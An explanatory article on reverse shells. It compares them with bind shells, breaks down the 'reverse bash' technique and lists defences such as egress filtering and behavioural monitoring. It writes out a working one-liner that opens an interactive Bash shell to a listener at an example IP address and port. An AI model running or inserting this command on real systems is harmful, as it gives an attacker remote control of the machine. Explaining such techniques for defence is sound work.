A **reverse shell** (sometimes called a connect-back shell) is a technique used in computer networking and cybersecurity
where a target computer initiates a network connection back to a listening computer, granting the listener remote
command-line control over the target.

To understand why it is called "reverse," it helps to contrast it with a traditional remote connection.

---

## Bind Shell vs. Reverse Shell

### 1. The Traditional (Bind) Shell

In a typical remote administration setup (like SSH), the server sits and listens for incoming connections. You (the client)
connect _inbound_ to the server, log in, and get a shell.

- **Direction:** Attacker/Admin $\rightarrow$ Target
- **The Problem:** If the target is behind a strict firewall or a NAT (Network Address Translation) router, the firewall will
  usually block unsolicited inbound connections.

### 2. The Reverse Shell

Instead of the administrator or attacker trying to break in through the firewall, the target machine is instructed to make an
_outbound_ connection to a specific IP address and port controlled by the supervisor or attacker.

- **Direction:** Target $\rightarrow$ Attacker/Admin
- **Why it works:** Most firewalls are configured to be highly restrictive of traffic coming _in_, but very permissive of
  traffic going _out_ (so that users can browse websites, download updates, etc.). A reverse shell sneaks through by looking
  like standard outbound web traffic.

---

## What is a "Reverse Bash"?

A **Reverse Bash** specifically refers to using the **Bash** shell (the default command-line interpreter on most Linux and
macOS systems) to create this connection.

Instead of downloading external hacking tools, a user or an attacker can leverage built-in system tools to redirect the
command line over the network. This is a tactic known as "Living off the Land."

### How it Works Conceptually

In a classic Unix/Linux environment, a basic reverse bash string looks similar to this:

$$\text{bash -i} >\& \text{ /dev/tcp/192.168.1.50/4444 } 0>\&1$$

Here is how the system breaks that down:

- **`bash -i`**: Starts an **interactive** Bash shell.
- **`>& /dev/tcp/192.168.1.50/4444`**: Redirects the shell's output and error messages over a network socket (`/dev/tcp`) to
  a specific IP address (`192.168.1.50`) and port (`4444`), where a listener application (like Netcat) is waiting.
- **`0>&1`**: Takes the network stream coming _from_ the controller and ties it to the target's standard input. Now, whatever
  the remote controller types is executed by the target's Bash terminal.

---

## How It Is Used

- **Legitimate System Administration:** Systems administrators use reverse connections to manage remote servers that are
  deeply nested inside secure networks without opening dangerous inbound ports on external firewalls.
- **Malicious Exploitation:** If an attacker finds a vulnerability (like a Command Injection bug) on a web server, they will
  often input a reverse shell command. This forces the server to reach out to the attacker's machine, giving them immediate,
  interactive control over the system.

## How to Defend Against Malicious Reverse Shells

Because reverse shells exploit permissive outbound rules, defending against them requires looking at what is leaving your
network, not just what is entering it:

- **Egress Filtering:** Configure firewalls to strictly block unauthorized _outbound_ traffic. For example, a web server
  should generally only be allowed to make outbound connections on ports 80 and 443 (HTTP/HTTPS) for updates, and nothing
  else.
- **Application Allowlisting:** Prevent arbitrary binaries or highly interactive shells (like Bash or PowerShell) from
  spawning network connections unexpectedly.
- **Behavioral Monitoring:** Security tools look for anomalies, such as a web server process (like Apache or Nginx) suddenly
  launching a Bash shell subprocess, which is a classic indicator of a reverse shell attack.
